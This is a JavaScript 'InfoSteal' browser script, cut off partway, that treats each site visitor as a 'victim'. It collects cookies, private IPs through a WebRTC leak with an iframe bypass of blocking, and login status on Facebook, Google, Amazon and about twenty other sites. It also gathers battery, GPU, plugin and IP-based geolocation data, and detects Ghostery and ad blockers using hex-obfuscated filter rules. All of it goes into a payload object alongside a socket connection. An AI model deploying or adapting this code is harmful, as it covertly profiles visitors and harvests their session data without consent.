/*
TODO:
- Location tracking
- phone tracking (orientation)
- LETS SEE HOW MANY WEB APIS WE CAN MESS WITH

*/
var socket = io.connect({
  secure: true
});

var victimid = Math.random().toString(36).substring(2);
var privip;
var batteryinfo;
var internetspeed;
var browserplugins = [];
var socialloggedin = [];

var networks = [{
  url: "https://squareup.com/login?return_to=%2Ffavicon.ico",
  name: "Square"
}, {
  url: "https://www.instagram.com/accounts/login/?next=%2Ffavicon.ico",
  name: "Instagram"
}, {
  url: "https://twitter.com/login?redirect_after_login=%2Ffavicon.ico",
  name: "Twitter"
}, {
  url: "https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffavicon.ico%3F_rdr%3Dp",
  name: "Facebook"
}, {
  url: "https://accounts.google.com/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico&uilel=3&hl=de&service=youtube",
  name: "Google"
}, , {
  url: "https://plus.google.com/up/accounts/upgrade/?continue=https://plus.google.com/favicon.ico",
  name: "Google Plus"
}, {
  url: "https://login.skype.com/login?message=signin_continue&redirect_uri=https%3A%2F%2Fsecure.skype.com%2Ffavicon.ico",
  name: "Skype"
}, {
  url: "https://www.flickr.com/signin/yahoo/?redir=https%3A%2F%2Fwww.flickr.com/favicon.ico",
  name: "Flickr"
}, {
  url: "https://www.spotify.com/de/login/?forward_url=https%3A%2F%2Fwww.spotify.com%2Ffavicon.ico",
  name: "Spotify"
}, {
  url: "https://www.reddit.com/login?dest=https%3A%2F%2Fwww.reddit.com%2Ffavicon.ico",
  name: "Reddit"
}, {
  url: "https://www.tumblr.com/login?redirect_to=%2Ffavicon.ico",
  name: "Tumblr"
}, {
  url: "https://www.expedia.de/user/login?ckoflag=0&selc=0&uurl=qscr%3Dreds%26rurl%3D%252Ffavicon.ico",
  name: "Expedia"
}, {
  url: "https://accounts.snapchat.com/accounts/login?continue=https://accounts.snapchat.com/accounts/static/images/favicon/favicon.png",
  name: "Snapchat"
}, {
  url: "https://www.dropbox.com/login?cont=https%3A%2F%2Fwww.dropbox.com%2Fstatic%2Fimages%2Ficons%2Ficon_spacer-vflN3BYt2.gif",
  name: "Dropbox"
}, {
  url: "https://www.amazon.com/ap/signin/178-4417027-1316064?_encoding=UTF8&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode= id_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=10000000&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Ffavicon.ico",
  name: "Amazon"
}, {
  url: "https://www.pinterest.com/login/?next=https%3A%2F%2Fwww.pinterest.com%2Ffavicon.ico",
  name: "Pinterest"
}, {
  url: "https://www.netflix.com/Login?nextpage=%2Ffavicon.ico",
  name: "Netflix"
}, {
  url: "https://de.foursquare.com/login?continue=%2Ffavicon.ico",
  name: "Foursquare"
}, {
  url: "https://eu.battle.net/login/de/index?ref=http://eu.battle.net/favicon.ico",
  name: "Battle.net"
}, {
  url: "https://store.steampowered.com/login/?redir=favicon.ico",
  name: "Steam"
}, {
  url: "https://www.academia.edu/login?cp=/favicon.ico&cs=www",
  name: "Academia.edu"
}, {
  url: "https://stackoverflow.com/users/login?ssrc=head&returnurl=http%3a%2f%2fstackoverflow.com%2ffavicon.ico",
  name: "Stack Overflow"
}, {
  url: "https://accounts.google.com/ServiceLogin?service=blogger&hl=de&passive=1209600&continue=https://www.blogger.com/favicon.ico",
  name: "Blogger"
}];

//Final Variables
var final = {
  victimid: victimid,
  cookies: document.cookie,
  url: document.URL,
  plugins: browserplugins,
  referrer: document.referrer,
  date: window.Date(),
  privateip: privip,
  internetspeed: internetspeed,
  connectiontype: (navigator.connection ? navigator.connection.type : null),
  language: navigator.language,
  DNT: navigator.doNotTrack,
  cookieEnabled: navigator.cookieEnabled,
  appCodeName: navigator.appCodeName,
  appName: navigator.appName,
  hardwareConcurrency: navigator.hardwareConcurrency,
  maxTouchPoints: navigator.maxTouchPoints,
  platform: navigator.platform,
  vendor: navigator.vendor,
  userAgent: navigator.userAgent,
  sizeScreenW: screen.width,
  sizeScreenH: screen.height,
  sizeDoc: document.width,
  sizeDocH: document.height,
  sizeInW: innerWidth,
  sizeInH: innerHeight,
  sizeAvailW: screen.availWidth,
  sizeAvailH: screen.availHeight,
  scrColorDepth: screen.colorDepth,
  scrPixelDepth: screen.pixelDepth,
  batterylevel: null,
  batterychargingstatus: null,
  batterydischarge: null,
  batterychargetime: null,
  cookiesv2: decodeURIComponent(document.cookie.split(";")),
  socialloggedin: socialloggedin,
  adBlockLists: []
}



function getPlugins() {
  try {
    for (var i = 0; i < navigator.plugins.length; i++) {
      browserplugins.push(navigator.plugins[i].name)
    }
    return a;
  } catch (e) {
    return null;
  }
}

//get the IP addresses associated with an account
function getIPs(callback) {
  var ip_dups = {};

  //compatibility for firefox and chrome
  var RTCPeerConnection = window.RTCPeerConnection ||
    window.mozRTCPeerConnection ||
    window.webkitRTCPeerConnection;
  var useWebKit = !!window.webkitRTCPeerConnection;

  //bypass naive webrtc blocking using an iframe
  if (!RTCPeerConnection) {
    //NOTE: you need to have an iframe in the page right above the script tag
    //
    //<iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
    //<script>...getIPs called in here...
    //
    var win = iframe.contentWindow;
    RTCPeerConnection = win.RTCPeerConnection ||
      win.mozRTCPeerConnection ||
      win.webkitRTCPeerConnection;
    useWebKit = !!win.webkitRTCPeerConnection;
  }

  //minimal requirements for data connection
  var mediaConstraints = {
    optional: [{
      RtpDataChannels: true
    }]
  };

  var servers = {
    iceServers: [{
      urls: "stun:stun.services.mozilla.com"
    }]
  };

  //construct a new RTCPeerConnection
  var pc = new RTCPeerConnection(servers, mediaConstraints);

  function handleCandidate(candidate) {
    //match just the IP address
    var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
    var ip_addr = ip_regex.exec(candidate)[1];

    //remove duplicates
    if (ip_dups[ip_addr] === undefined)
      callback(ip_addr);

    ip_dups[ip_addr] = true;
  }

  //listen for candidate events
  pc.onicecandidate = function(ice) {

    //skip non-candidate events
    if (ice.candidate)
      handleCandidate(ice.candidate.candidate);
  };

  //create a bogus data channel
  pc.createDataChannel("");

  //create an offer sdp
  pc.createOffer(function(result) {

    //trigger the stun server request
    pc.setLocalDescription(result, function() {}, function() {});

  }, function() {});

  //wait for a while to let everything done
  setTimeout(function() {
    //read candidate info from local description
    var lines = pc.localDescription.sdp.split('\n');

    lines.forEach(function(line) {
      if (line.indexOf('a=candidate:') === 0)
        handleCandidate(line);
    });
  }, 1000);

}

(function() {

  getPlugins()

  if (navigator.getBattery) {
        //Battery Info
        navigator.getBattery().then(function(battery) {
          batteryinfo = battery
          final.batterylevel = battery.level
          final.batterychargingstatus = battery.charging
          final.batterydischarge = battery.dischargingTime
          final.batterychargetime = battery.chargingTime
      })
  }

  if (window.matchMedia("(orientation: landscape)").matches) {
    final.orientation = 'landscape'
  } else {
    final.orientation = 'portrait'
  }

  getIPs(function(ip) {
    final.privateip = ip
  })

  networks.forEach(function(network) {
    var img = document.createElement('img');
    img.src = network.url;
    img.onload = function() {
      socialloggedin.push(network.name)
    };
    img.onerror = function() {
      // print(network.name + ': not logged in');
    }
  });

  var imageAddr = "https://upload.wikimedia.org/wikipedia/commons/2/2d/Snake_River_%285mb%29.jpg";
  var downloadSize = 5245329; //bytes
  var oProgress = document.getElementById("speed");

  function ShowProgressMessage(msg) {
    if (console) {
      if (typeof msg == "string") {
        console.log(msg);
      } else {
        for (var i = 0; i < msg.length; i++) {
          console.log(msg[i]);
        }
      }
    }

    if (oProgress) {
      var actualHTML = (typeof msg == "string") ? msg : msg.join(" ");
      oProgress.innerHTML = actualHTML;
    }
  }

  function InitiateSpeedDetection() {
    window.setTimeout(MeasureConnectionSpeed, 1);
  };

  if (window.addEventListener) {
    window.addEventListener('load', InitiateSpeedDetection, false);
  } else if (window.attachEvent) {
    window.attachEvent('onload', InitiateSpeedDetection);
  }

  function MeasureConnectionSpeed() {
    var startTime, endTime;
    var download = new Image();
    download.onload = function() {
      endTime = (new Date()).getTime();
      showResults();
    }

    download.onerror = function(err, msg) {
      ShowProgressMessage("Invalid image, or error downloading");
    }

    startTime = (new Date()).getTime();
    var cacheBuster = "?nnn=" + startTime;
    download.src = imageAddr + cacheBuster;

    function showResults() {
      var duration = (endTime - startTime) / 1000;
      var bitsLoaded = downloadSize * 8;
      var speedBps = (bitsLoaded / duration).toFixed(2);
      var speedKbps = (speedBps / 1024).toFixed(2);
      var speedMbps = (speedKbps / 1024).toFixed(2);
      final.internetspeed = speedKbps + " Kbps"
    }
  }
  MeasureConnectionSpeed();

  //insert IP addresses into the page
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (xhttp.readyState == 4 && xhttp.status == 200) {
      let parsed = JSON.parse(xhttp.responseText)
      final.isp = parsed.ip.asn
      final.city = parsed.ip.city
      final.country = parsed.ip.country
      final.hostname = parsed.ip.hostname
      final.publicip = parsed.ip.ip
      fetch('https://cors-anywhere.herokuapp.com/https://ip-api.io/json/'+final.publicip, {headers: new Headers({
        'Origin': 'InfoSteal'
      })}).then(function(res){
        res.json().then(text => {
          final.suspicious_factors = text.suspicious_factors
        })
      })
      final.longitude = parsed.ip.longitude
      final.latitude = parsed.ip.latitude

    }
  };

  xhttp.open("GET", "https://ip.nf/me.json", true);
  xhttp.send();
  
  var parser = new UAParser()
  final.osversion = parser.getOS().name + ' ' + parser.getOS().version
  final.browserversion = parser.getBrowser().name + ' ' + parser.getBrowser().version

  var canvas = document.getElementById("glcanvas");
  try {
    gl = canvas.getContext("experimental-webgl");
    gl.viewportWidth = canvas.width;
    gl.viewportHeight = canvas.height;
  } catch (e) {}
  if (gl) {
    var extension = gl.getExtension('WEBGL_debug_renderer_info');

    if (extension != undefined) {
      final.webglvendor = gl.getParameter(extension.UNMASKED_VENDOR_WEBGL)
      final.webglrenderer = gl.getParameter(extension.UNMASKED_RENDERER_WEBGL)
    } else {
      final.webglvendor = gl.getParameter(gl.VENDOR)
      final.webglrenderer = gl.getParameter(gl.RENDERER)
    }
  }
}());

//Ghostery detect
let ghostTest = $('#ghostery-box');

if (ghostTest.length > 0) {
  final.ghostery = true
}

//Borrowed code from https://browserleaks.com
function proxy_ab(){return[{name:"Allow nonintrusive advertising",code:"a3",rules:[{type:1,body:'\x63\x6c\x61\x73\x73\x3d\x22\x61\x62\x70\x5f\x6f\x62\x5f\x65\x78\x69\x73\x74\x22'}]},{name:"uBlock filters",code:"a3",rules:[{type:3,force:!0,body:"\x63\x64\x6e\x2e\x64\x65\x61\x64\x6c\x69\x6e\x65\x2e\x63\x6f\x6d"},{type:4,force:!0,body:"\x2f\x3f\x2a\x26\x63\x61\x6c\x6c\x62\x61\x63\x6b\x3d\x63\x61\x6c\x6c\x62\x61\x63\x6b\x5f\x6a\x73\x6f\x6e\x5f\x61\x64\x62\x6c\x61\x64\x65"}]},{name:"uBlock filters – Badware risks",code:"a3",rules:[{type:3,body:"\x66\x6c\x65\x78\x79\x74\x61\x6c\x6b\x2e\x6e\x65\x74"}]},{name:"AAK-Cont Filters For uBlock Origin",code:"a3",rules:[{type:1,body:'\x69\x64\x3d\x22\x57\x61\x72\x6e\x69\x6e\x67\x43\x6f\x64\x65\x63\x22'}]},{name:"EasyList",code:"a3",rules:[{type:1,body:'\x69\x64\x3d\x22\x5a\x65\x72\x67\x6e\x65\x74\x22\x20\x63\x6c\x61\x73\x73\x3d\x22\x7a\x65\x72\x67\x6e\x65\x74\x22'}]},{name:"EasyPrivacy",code:"a3",rules:[{type:2,body:"\x26\x70\x61\x67\x65\x52\x65\x66\x65\x72\x72\x65\x72\x3d"}]},{name:"ABPindo",code:"id",rules:[{type:1,body:'\x69\x64\x3d\x22\x64\x65\x77\x69\x71\x71\x22'}]},{name:"Bulgarian list",code:"bg",rules:[{type:1,body:'\x69\x64\x3d\x22\x65\x61\x5f\x69\x6e\x74\x65\x78\x74\x5f\x64\x69\x76\x22'}]},{name:"EasyList China",code:"cn",rules:[{type:1,body:'\x63\x6c\x61\x73\x73\x3d\x22\x61\x5f\x66\x72\x22'}]},{name:"EasyList Dutch",code:"nl",rules:[{type:1,body:'\x63\x6c\x61\x73\x73\x3d\x22\x61\x77\x5f\x75\x72\x6c\x5f\x61\x64\x6d\x61\x72\x6b\x74\x5f\x62\x6f\x74\x74\x6f\x6d\x22'}]},{name:"EasyList Germany",code:"de",rules:[{type:1,body:'\x69\x64\x3d\x22\x57\x65\x72\x62\x75\x6e\x67\x4f\x62\x65\x6e\x52\x65\x63\x68\x74\x73\x31\x30\x5f\x47\x65\x73\x61\x6d\x74\x44\x49\x56\x22'}]},{name:"EasyList Italy",code:"it",rules:[{type:1,body:'\x63\x6c\x61\x73\x73\x3d\x22\x6d\x6f\x64\x50\x75\x62\x62\x6c\x69\x63\x69\x74\x61\x22'}]},{name:"EasyList Hebrew",code:"il",rules:[{type:0,last_child:!0,body:'\x3c\x64\x69\x76\x20\x63\x6c\x61\x73\x73\x3d\x22\x77\x70\x76\x6c\x20\x77\x70\x76\x6c\x2d\x64\x61\x69\x6c\x79\x6d\x6f\x74\x69\x6f\x6e\x22\x3e\x3c\x64\x69\x76\x20\x63\x6c\x61\x73\x73\x3d\x22\x66\x62\x6c\x6f\x67\x69\x6e\x20\x6c\x6f\x63\x6b\x6f\x76\x65\x72\x6c\x61\x79\x20\x6e\x67\x2d\x73\x63\x6f\x70\x65\x22\x3e\x3c\x2f\x64\x69\x76\x3e\x3c\x2f\x64\x69\x76\x3e'}]},{name:"EasyList Lithuania",code:"lt",rules:[{type:1,body:'\x69\x64\x3d\x22\x64\x65\x6c\x66\x69\x2d\x66\x72\x6f\x6e\x74\x2d\x72\x69\x67\x68\x74\x2d\x63\x6f\x6c\x75\x6d\x6e\x22'}]},{name:"EasyList Spanish",code:"es",rules:[{type:1,body:'\x63\x6c\x61\x73\x73\x3d\x22\x70\x72\x6f\x6d\x6f\x63\x69\x6f\x6e\x5f\x6c\x69\x62\x72\x65\x22'}]},{name:"EasyList Czech and Slovak",code:"cz",rules:[{type:1,body:'\x63\x6c\x61\x73\x73\x3d\x22\x73\x6b\x6c\x69\x6b\x2d\x62\x6c\x6f\x63\x6b\x22'}]},{name:"EasyList Polish",code:"pl",rules:[{type:1,body:'\x69\x64\x3d\x22\x74\x79\x74\x75\x6c\x5f\x73\x70\x6f\x6e\x73\x6f\x72\x6f\x77\x61\x6e\x65\x22'}]},{name:"Schacks Adblock Plus liste",code:"dk",rules:[{type:3,body:"\x6a\x75\x62\x69\x69\x74\x61\x67\x2e\x64\x6b"}]},{name:"Liste AR",code:"ae",rules:[{type:1,body:'\x63\x6c\x61\x73\x73\x3d\x22\x65\x33\x6c\x61\x6e\x2d\x63\x6f\x64\x65\x22'}]},{name:"Liste FR",code:"fr",rules:[{type:1,body:'\x69\x64\x3d\x22\x66\x69\x78\x65\x5f\x70\x6c\x75\x67\x69\x6e\x22'}]},{name:"ROList",code:"ro",rules:[{type:0,body:'\x3c\x44\x49\x56\x20\x69\x64\x3d\x22\x72\x65\x63\x6c\x61\x6d\x61\x22\x2f\x3e'}]},{name:"RU AdList",code:"ru",rules:[{type:1,body:'\x63\x6c\x61\x73\x73\x3d\x22\x6d\x65\x72\x63\x5f\x74\x69\x74\x6c\x65\x5f\x32\x22'}]},{name:"Adblock List for Finland",code:"fi",rules:[{type:1,body:'\x69\x64\x3d\x22\x6d\x61\x69\x6e\x6f\x73\x22'}]},{name:"Dandelion Sprout's Norwegian List",code:"no",rules:[{type:1,body:'\x63\x6c\x61\x73\x73\x3d\x22\x66\x75\x6c\x6c\x2d\x77\x69\x64\x74\x68\x20\x64\x61\x69\x6c\x79\x2d\x6f\x66\x66\x65\x72\x73\x22'}]},{name:"Greek AdBlock Filter",code:"gr",rules:[{type:0,body:'\x3c\x44\x49\x56\x20\x63\x6c\x61\x73\x73\x3d\x22\x61\x67\x6f\x72\x65\x73\x33\x30\x30\x22\x2f\x3e'}]},{name:"Latvian List",code:"lv",rules:[{type:0,body:'\x3c\x61\x20\x68\x72\x65\x66\x3d\x22\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x73\x61\x6c\x69\x64\x7a\x69\x6e\x69\x2e\x6c\x76\x2f\x22\x20\x73\x74\x79\x6c\x65\x3d\x22\x64\x69\x73\x70\x6c\x61\x79\x3a\x20\x62\x6c\x6f\x63\x6b\x3b\x20\x77\x69\x64\x74\x68\x3a\x20\x31\x32\x30\x70\x78\x3b\x20\x68\x65\x69\x67\x68\x74\x3a\x20\x34\x30\x70\x78\x3b\x20\x6f\x76\x65\x72\x66\x6c\x6f\x77\x3a\x20\x68\x69\x64\x64\x65\x6e\x3b\x20\x70\x6f\x73\x69\x74\x69\x6f\x6e\x3a\x20\x72\x65\x6c\x61\x74\x69\x76\x65\x3b\x22\x20\x72\x65\x6c\x3d\x22\x6e\x6f\x6f\x70\x65\x6e\x65\x72\x20\x6e\x6f\x66\x6f\x6c\x6c\x6f\x77\x22\x20\x73\x74\x79\x6c\x65\x3d\x22\x70\x6f\x73\x69\x74\x69\x6f\x6e\x3a\x61\x62\x73\x6f\x6c\x75\x74\x65\x21\x69\x6d\x70\x6f\x72\x74\x61\x6e\x74\x3b\x6c\x65\x66\x74\x3a\x2d\x39\x39\x39\x39\x70\x78\x3b\x74\x6f\x70\x3a\x2d\x39\x39\x39\x39\x70\x78\x3b\x70\x6f\x69\x6e\x74\x65\x72\x2d\x65\x76\x65\x6e\x74\x73\x3a\x6e\x6f\x6e\x65\x3b\x63\x75\x72\x73\x6f\x72\x3a\x64\x65\x66\x61\x75\x6c\x74\x22\x3e\x3c\x2f\x61\x3e'}]},{name:"Czech List",code:"cz",rules:[{type:0,body:'\x3c\x64\x69\x76\x20\x69\x64\x3d\x22\x65\x74\x61\x72\x67\x65\x74\x63\x6f\x6e\x74\x61\x69\x6e\x65\x72\x22\x2f\x3e'}]},{name:"Filtros Nauscopicos",code:"es",rules:[{type:1,body:'\x69\x64\x3d\x22\x74\x61\x64\x73\x32\x22'}]},{name:"hufilter",code:"hu",rules:[{type:0,body:'\x3c\x44\x49\x56\x20\x69\x64\x3d\x22\x63\x65\x6d\x70\x5f\x64\x6f\x62\x6f\x7a\x22\x3e\x3c\x2f\x64\x69\x76\x3e'}]},{name:"Peter Lowe's list",code:"a3",rules:[{type:3,body:"\x72\x65\x6d\x6f\x78\x2e\x63\x6f\x6d"}]},{name:"ABP X Files",code:"it",rules:[{type:1,body:'\x69\x64\x3d\x22\x7a\x7a\x73\x6c\x69\x64\x65\x72\x6c\x61\x79\x65\x72\x5f\x74\x63\x5f\x62\x6f\x78\x22'}]},{name:"Malware Domains",code:"a3",rules:[{type:3,body:"\x73\x74\x79\x63\x6e\x2e\x63\x6f\x6d"}]},{name:"ABP Japanese Filters",code:"jp",rules:[{type:2,body:"\x26\x74\x72\x61\x63\x6b\x5f\x69\x64\x3d"}]},{name:"Icelandic ABP List",code:"ie",rules:[{type:0,body:'\x3c\x41\x20\x68\x72\x65\x66\x3d\x22\x2f\x66\x72\x61\x6d\x65\x77\x6f\x72\x6b\x2f\x72\x65\x73\x6f\x75\x72\x63\x65\x73\x2f\x66\x6f\x72\x6d\x73\x2f\x61\x64\x73\x2e\x61\x73\x70\x78\x22\x20\x72\x65\x6c\x3d\x22\x6e\x6f\x6f\x70\x65\x6e\x65\x72\x20\x6e\x6f\x66\x6f\x6c\x6c\x6f\x77\x22\x20\x73\x74\x79\x6c\x65\x3d\x22\x70\x6f\x69\x6e\x74\x65\x72\x2d\x65\x76\x65\x6e\x74\x73\x3a\x6e\x6f\x6e\x65\x3b\x63\x75\x72\x73\x6f\x72\x3a\x64\x65\x66\x61\x75\x6c\x74\x22\x3e\x3c\x2f\x61\x3e'}]},{name:"Adblock Warning Removal List",code:"a3",rules:[{type:1,body:'\x69\x64\x3d\x22\x61\x64\x62\x6c\x6f\x63\x6b\x2d\x6d\x73\x67\x22'}]},{name:"Prebake",code:"eu",rules:[{type:1,body:'\x63\x6c\x61\x73\x73\x3d\x22\x63\x6d\x2d\x6d\x65\x73\x73\x61\x67\x65\x22'}]},{name:"Spam404",code:"a3",rules:[{type:0,body:'\x3c\x64\x69\x76\x20\x6f\x6e\x63\x6c\x69\x63\x6b\x3d\x22\x66\x69\x6c\x65\x69\x63\x65\x28\x29\x3b\x22\x3e\x3c\x2f\x64\x69\x76\x3e'}]},{name:"AdblockList.org",code:"pl",rules:[{type:1,body:'\x69\x64\x3d\x22\x61\x64\x76\x65\x72\x74\x69\x73\x65\x6d\x65\x6e\x74\x43\x46\x22'}]},{name:"Fanboy's Enhanced Tracking List",code:"a3",rules:[{type:1,body:'\x63\x6c\x61\x73\x73\x3d\x22\x61\x63\x6e\x2d\x7a\x65\x72\x6f\x2d\x72\x65\x6d\x61\x69\x6e\x69\x6e\x67\x2d\x6f\x76\x65\x72\x6c\x61\x79\x22'}]},{name:"Fanboy's Annoyance List",code:"a3",rules:[{type:1,body:'\x69\x64\x3d\x22\x63\x73\x6d\x2d\x6d\x61\x69\x6c\x73\x69\x67\x6e\x75\x70\x2d\x62\x6f\x64\x79\x2d\x66\x6f\x72\x6d\x22'}]},{name:"Fanboy's Social Blocking List",code:"a3",rules:[{type:1,body:'\x63\x6c\x61\x73\x73\x3d\x22\x77\x78\x2d\x73\x6f\x63\x69\x61\x6c\x2d\x73\x68\x61\x72\x65\x2d\x6c\x73\x2d\x77\x72\x61\x70\x70\x65\x72\x22'}]},{name:"Fanboy's Thirdparty Fonts Filters",code:"a3",rules:[{type:3,body:"\x66\x6f\x6e\x74\x73\x2e\x74\x69\x6d\x65\x69\x6e\x63\x2e\x6e\x65\x74"}]},{name:"Fanboy's Espanol/Portuguese",code:"es",rules:[{type:1,body:'\x69\x64\x3d\x22\x71\x75\x65\x54\x6f\x6f\x6c\x74\x69\x70\x22'},{type:1,body:'\x63\x6c\x61\x73\x73\x3d\x22\x61\x64\x73\x62\x6f\x78\x22'}]},{name:"Fanboy's Indian",code:"in",rules:[{type:2,body:"\x2f\x63\x6f\x75\x2e\x70\x68\x70\x3f"}]},{name:"Fanboy's Japanese",code:"jp",rules:[{type:3,body:"\x61\x64\x2e\x70\x72\x2e\x61\x6d\x65\x62\x61\x2e\x6a\x70"}]},{name:"Fanboy's Korean",code:"kr",rules:[{type:1,body:'\x69\x64\x3d\x22\x66\x72\x61\x6d\x65\x53\x70\x6f\x6e\x73\x65\x72\x22'}]},{name:"Fanboy's Polish",code:"pl",rules:[{type:1,body:'\x69\x64\x3d\x22\x75\x6e\x64\x65\x72\x5f\x70\x6c\x61\x63\x65\x61\x64\x35\x5f\x31\x22'}]},{name:"Fanboy's Swedish",code:"se",rules:[{type:1,body:'\x63\x6c\x61\x73\x73\x3d\x22\x6e\x79\x68\x65\x74\x5f\x77\x72\x61\x70\x70\x65\x72\x5f\x61\x6e\x6e\x6f\x6e\x73\x22'}]},{name:"Fanboy's Turkish",code:"tr",rules:[{type:1,body:'\x69\x64\x3d\x22\x55\x73\x74\x2d\x52\x65\x6b\x6c\x61\x6d\x2d\x50\x69\x79\x61\x73\x61\x22'}]},{name:"Fanboy's Vietnamese",code:"vn",rules:[{type:1,body:'\x63\x6c\x61\x73\x73\x3d\x22\x71\x75\x61\x6e\x67\x63\x61\x6f\x5f\x72\x69\x67\x68\x74\x75\x70\x22'}]},{name:"Adversity",code:"a3",rules:[{type:1,body:'\x63\x6c\x61\x73\x73\x3d\x22\x76\x6e\x5f\x73\x70\x6f\x6e\x73\x62\x6c\x6f\x63\x6b\x22'}]},{name:"Antisocial",code:"a3",rules:[{type:1,body:'\x74\x69\x74\x6c\x65\x3d\x22\x54\x77\x65\x65\x74\x20\x74\x68\x69\x73\x20\x71\x75\x65\x73\x74\x69\x6f\x6e\x22'}]},{name:"Extreme Measures",code:"a3",rules:[{type:1,body:'\x69\x64\x3d\x22\x65\x63\x78\x49\x6e\x63\x72\x65\x64\x69\x53\x74\x61\x6d\x70\x22'}]},{name:"ABPVN List",code:"vn",rules:[{type:1,body:'\x69\x64\x3d\x22\x71\x63\x42\x61\x6c\x6c\x6f\x6e\x72\x69\x67\x68\x74\x22'}]},{name:"CJX's Annoyance List",code:"cn",rules:[{type:1,body:'\x69\x64\x3d\x22\x71\x72\x63\x6f\x64\x65\x57\x72\x61\x70\x22'}]},{name:"AdBlockFarsi",code:"ir",rules:[{type:1,body:'\x63\x6c\x61\x73\x73\x3d\x22\x74\x61\x62\x6c\x69\x67\x68\x2d\x6c\x65\x66\x74\x22'}]},{name:"Blockzilla",code:"a3",rules:[{type:1,body:'\x63\x6c\x61\x73\x73\x3d\x22\x70\x6c\x69\x73\x74\x61\x41\x6c\x6c\x4f\x75\x74\x65\x72\x22'}]},{name:"Eesti saitidele kohandatud filter",code:"ee",rules:[{type:0,body:'\x3c\x61\x20\x68\x72\x65\x66\x3d\x22\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x76\x6f\x69\x64\x28\x30\x29\x3b\x6e\x6f\x70\x3d\x5c\x27\x68\x74\x74\x70\x3a\x2f\x2f\x70\x61\x79\x34\x72\x65\x73\x75\x6c\x74\x73\x32\x34\x2e\x65\x75\x5c\x27\x22\x20\x72\x65\x6c\x3d\x22\x6e\x6f\x6f\x70\x65\x6e\x65\x72\x20\x6e\x6f\x66\x6f\x6c\x6c\x6f\x77\x22\x20\x73\x74\x79\x6c\x65\x3d\x22\x70\x6f\x69\x6e\x74\x65\x72\x2d\x65\x76\x65\x6e\x74\x73\x3a\x6e\x6f\x6e\x65\x3b\x63\x75\x72\x73\x6f\x72\x3a\x64\x65\x66\x61\x75\x6c\x74\x22\x3e\x3c\x2f\x61\x3e'}]},{name:"Estonian filters by Gurud.ee",code:"ee",rules:[{type:1,body:'\x63\x6c\x61\x73\x73\x3d\x22\x63\x68\x69\x6c\x6c\x69\x5f\x6c\x61\x79\x65\x72\x22'}]},{name:"Squidblacklist.org Ad Servers",code:"a3",rules:[{type:3,body:"\x64\x69\x6d\x61\x67\x67\x69\x6f\x2e\x68\x65\x61\x72\x74\x6c\x69\x67\x68\x74\x2e\x6f\x72\x67"}]},{name:"YousList",code:"kr",rules:[{type:0,body:'\x3c\x64\x69\x76\x20\x69\x64\x3d\x22\x61\x64\x79\x61\x5f\x61\x72\x65\x61\x22\x2f\x3e'}]},{name:"Adware filters",code:"a3",rules:[{type:3,body:"\x74\x68\x65\x61\x70\x70\x73\x72\x76\x72\x2e\x63\x6f\x6d"}]},{name:"I don't care about cookies",code:"eu",rules:[{type:1,body:'\x69\x64\x3d\x22\x41\x6c\x6c\x6f\x77\x43\x6f\x6f\x6b\x69\x65\x73\x57\x72\x61\x70\x70\x65\x72\x22'}]},{name:"Adblock Polska",code:"pl",rules:[{type:1,body:'\x63\x6c\x61\x73\x73\x3d\x22\x70\x65\x65\x6c\x6f\x76\x65\x72\x6c\x61\x79\x22'}]},{name:"Malvertising filter list by Disconnect",code:"a3",rules:[{type:3,body:"\x6f\x6c\x69\x77\x65\x69\x2e\x63\x6f\x6d"}]},{name:"Fanboy's Anti-Facebook List",code:"a3",rules:[{type:3,body:"\x61\x70\x69\x2e\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2e\x63\x6f\x6d"}]},{name:"Adblock-Iran",code:"ir",rules:[{type:1,body:'\x69\x64\x3d\x22\x73\x61\x62\x61\x6c\x69\x67\x68\x74\x42\x6f\x78\x22'}]},{name:"Korean Adblock List",code:"kr",rules:[{type:1,body:'\x63\x6c\x61\x73\x73\x3d\x22\x64\x61\x5f\x61\x72\x65\x61\x5f\x62\x6f\x74\x22'}]},{name:"polskie filtry do Adblocka i uBlocka",code:"pl",rules:[{type:1,body:'\x69\x64\x3d\x22\x61\x5f\x32\x30\x31\x22'}]},{name:"Slovenian List",code:"si",rules:[{type:1,body:'\x63\x6c\x61\x73\x73\x3d\x22\x70\x61\x6e\x65\x2d\x75\x72\x65\x64\x6e\x69\x73\x6b\x69\x2d\x6f\x67\x6c\x61\x73\x69\x2d\x6e\x61\x2d\x6e\x61\x73\x6c\x6f\x76\x6e\x69\x63\x69\x2d\x63\x75\x73\x74\x6f\x6d\x2d\x61\x64\x2d\x33\x30\x30\x2d\x31\x35\x30\x22'}]},{name:"MalwareDomainList.com Hosts List",code:"a3",rules:[{type:3,body:"\x63\x6f\x70\x65\x2e\x69\x74"}]},{name:"MVPS HOSTS",code:"a3",rules:[{type:3,body:"\x67\x65\x6f\x2e\x67\x65\x78\x6f\x2e\x63\x6f\x6d"}]},{name:"hpHosts",code:"a3",rules:[{type:3,body:"\x69\x6d\x61\x67\x65\x73\x2e\x6d\x30\x2e\x6e\x65\x74"}]},{name:"Dan Pollock's hosts file",code:"a3",rules:[{type:3,body:"\x77\x77\x77\x2e\x74\x72\x61\x76\x65\x6c\x6e\x63\x73\x2e\x63\x6f\x6d"}]},{name:"Cryptocurrency Mining Protection List",code:"a3",rules:[{type:2,body:"\x3a\x2f\x2f\x2e\x63\x6f\x69\x6e\x62\x6c\x69\x6e\x64\x2e\x63\x6f\x6d\x2f\x6c\x69\x62\x2f"}]},{name:"Adguard 